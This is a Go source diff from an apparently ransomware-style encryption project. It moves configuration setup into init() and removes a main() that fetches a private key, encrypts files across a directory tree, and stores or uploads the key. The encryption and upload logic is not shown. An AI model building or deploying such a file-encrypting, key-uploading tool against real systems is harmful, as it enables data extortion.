@@ -1,21 +1,23 @@
 package main
 
 import (
+	"fmt"
 	"log"
 	"net"
+	"os"
 	"path/filepath"
 	"strconv"
-	"sync"
-
-	"fmt"
-	"os"
 
 	"github.com/spf13/pflag"
 	"github.com/spf13/viper"
-	"github.com/sywc670/willcrypt/internal/utils"
 )
 
-func configure() {
+func init() {
+	initConf()
+	check()
+}
+
+func initConf() {
 	configFile := pflag.StringP("config", "c", filepath.Join(getExeLoc(), "config.yml"), "default relative to exe")
 	pflag.String("location", "testground", "relative to workdir")
 	verbose := pflag.BoolP("verbose", "v", false, "")
@@ -46,7 +48,6 @@ func configure() {
 		log.Fatalf("Load config fail: %v\n", err)
 	}
 
-	check()
 }
 
 func check() {
@@ -100,32 +101,6 @@ func check() {
 			os.Exit(1)
 		}
 	}
-}
-
-func main() {
-	configure()
-
-	priv, err := getPrivKey()
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "Get priv key error: %v.\n", err)
-		os.Exit(1)
-	}
-
-	if cfg.Verbose || cfg.Mode == ModeGenRemote {
-		fmt.Println()
-		fmt.Println("Priv key:")
-		fmt.Println(utils.EncodeBase64(utils.Stringify(priv)))
-		fmt.Println()
-	}
-
-	var wg sync.WaitGroup
-	wg.Add(1)
-	goWalkCryption(priv, &wg)
-	wg.Wait()
-	if !cfg.Decode {
-		storeOrUpload(priv)
-	}
-	debug("Done...")
 }
 
 func getExeLoc() string {
